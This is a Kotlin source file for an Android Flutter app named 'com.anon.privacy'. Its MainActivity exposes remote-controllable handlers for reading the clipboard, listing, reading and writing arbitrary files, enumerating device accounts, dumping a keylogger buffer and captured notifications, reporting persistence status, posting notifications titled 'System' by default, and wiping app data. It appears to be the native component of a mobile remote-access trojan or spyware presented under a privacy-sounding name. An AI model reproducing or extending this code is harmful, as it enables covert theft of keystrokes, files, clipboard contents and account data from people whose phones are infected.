package com.anon.privacy

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.os.Build
import android.accounts.AccountManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.util.Base64
import androidx.core.app.NotificationCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.io.File

/**
 * Native host — device info, clipboard, filesystem (list/read/write),
 * accounts, notification/keylog buffers, persist status, local notification, wipe.
 */
class MainActivity : FlutterActivity() {
    private val channelName = "com.anon.privacy/host"
    private val maxTransferBytes = 12 * 1024 * 1024

    companion object {
        @Volatile
        var keylogBuffer: String = ""

        @Volatile
        var notificationBuffer: String = ""
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, channelName)
            .setMethodCallHandler { call, result ->
                try {
                    when (call.method) {
                        "deviceInfo" -> result.success(deviceInfo())
                        "clipboardRead" -> result.success(clipboardRead())
                        "listDir" -> {
                            val path = call.argument<String>("path") ?: "/sdcard"
                            result.success(listDir(path))
                        }
                        "readFile" -> {
                            val path = call.argument<String>("path")
                                ?: throw IllegalArgumentException("path required")
                            result.success(readFile(path))
                        }
                        "writeFile" -> {
                            val path = call.argument<String>("path")
                                ?: throw IllegalArgumentException("path required")
                            val b64 = call.argument<String>("b64")
                                ?: throw IllegalArgumentException("b64 required")
                            result.success(writeFile(path, b64))
                        }
                        "listAccounts" -> result.success(listAccounts())
                        "notificationDump" -> result.success(notificationDump())
                        "keylogDump" -> result.success(keylogDump())
                        "persistStatus" -> result.success(persistStatus())
                        "showNotification" -> {
                            val title = call.argument<String>("title") ?: "System"
                            val body = call.argument<String>("body") ?: ""
                            result.success(showNotification(title, body))
                        }
                        "wipeAppData" -> result.success(wipeAppData())
                        else -> result.notImplemented()
                    }
                } catch (e: Exception) {
                    result.error("HOST", e.message, null)
                }
            }
    }

    private fun deviceInfo(): Map<String, Any?> = mapOf(
        "manufacturer" to Build.MANUFACTURER,
        "model" to Build.MODEL,
        "device" to Build.DEVICE,
        "brand" to Build.BRAND,
        "sdk" to Build.VERSION.SDK_INT,
        "release" to Build.VERSION.RELEASE,
        "fingerprint" to Build.FINGERPRINT,
    )

    private fun clipboardRead(): Map<String, Any?> {
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip: ClipData? = cm.primaryClip
        val text = if (clip != null && clip.itemCount > 0) {
            clip.getItemAt(0).coerceToText(this).toString()
        } else ""
        return mapOf("text" to text, "hasClip" to (clip != null && clip.itemCount > 0))
    }

    private fun listDir(path: String): Map<String, Any?> {
        val dir = File(path)
        if (!dir.exists()) throw IllegalArgumentException("path not found: $path")
        if (!dir.isDirectory) throw IllegalArgumentException("not a directory: $path")
        val entries = dir.listFiles()?.sortedBy { it.name.lowercase() }?.take(300)?.map { f ->
            mapOf(
                "name" to f.name,
                "path" to f.absolutePath,
                "type" to if (f.isDirectory) "dir" else "file",
                "size" to f.length(),
            )
        } ?: emptyList()
        return mapOf("path" to path, "cwd" to path, "entries" to entries)
    }

    private fun readFile(path: String): Map<String, Any?> {
        val f = File(path)
        if (!f.exists() || !f.isFile) throw IllegalArgumentException("file not found: $path")
        if (f.length() > maxTransferBytes) {
            throw IllegalArgumentException("file too large (>${maxTransferBytes} bytes)")
        }
        val bytes = f.readBytes()
        return mapOf(
            "path" to f.absolutePath,
            "name" to f.name,
            "size" to bytes.size,
            "b64" to Base64.encodeToString(bytes, Base64.NO_WRAP),
            "mime" to "application/octet-stream",
        )
    }

    private fun writeFile(path: String, b64: String): Map<String, Any?> {
        val bytes = Base64.decode(b64, Base64.DEFAULT)
        if (bytes.size > maxTransferBytes) {
            throw IllegalArgumentException("payload too large (>${maxTransferBytes} bytes)")
        }
        val f = File(path)
        f.parentFile?.mkdirs()
        f.writeBytes(bytes)
        return mapOf(
            "path" to f.absolutePath,
            "size" to bytes.size,
            "written" to true,
        )
    }

    private fun listAccounts(): Map<String, Any?> {
        val am = AccountManager.get(this)
        val accounts = am.accounts.map { a ->
            mapOf("name" to a.name, "type" to a.type)
        }
        return mapOf("accounts" to accounts, "count" to accounts.size)
    }

    private fun notificationDump(): Map<String, Any?> =
        mapOf("buffer" to notificationBuffer, "note" to "requires notification listener when bound")

    private fun keylogDump(): Map<String, Any?> {
        val snap = keylogBuffer
        return mapOf("text" to snap, "length" to snap.length)
    }

    private fun persistStatus(): Map<String, Any?> = mapOf(
        "package" to packageName,
        "dataDir" to applicationInfo.dataDir,
        "targetSdk" to applicationInfo.targetSdkVersion,
        "uid" to applicationInfo.uid,
    )

    private fun showNotification(title: String, body: String): Map<String, Any?> {
        val channelId = "anon_ops"
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.createNotificationChannel(
                NotificationChannel(channelId, "Anon", NotificationManager.IMPORTANCE_DEFAULT)
            )
        }
        val pi = PendingIntent.getActivity(
            this, 0, packageManager.getLaunchIntentForPackage(packageName),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val n = NotificationCompat.Builder(this, channelId)
            .setContentTitle(title)
            .setContentText(body)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pi)
            .setAutoCancel(true)
            .build()
        nm.notify((System.currentTimeMillis() % Int.MAX_VALUE).toInt(), n)
        return mapOf("shown" to true, "title" to title)
    }

    private fun wipeAppData(): Map<String, Any?> {
        val dir = applicationInfo.dataDir
        var cleared = 0
        File(dir).listFiles()?.forEach { f ->
            if (f.name == "lib") return@forEach
            if (f.deleteRecursively()) cleared++
        }
        return mapOf("clearedEntries" to cleared, "dataDir" to dir)
    }
}
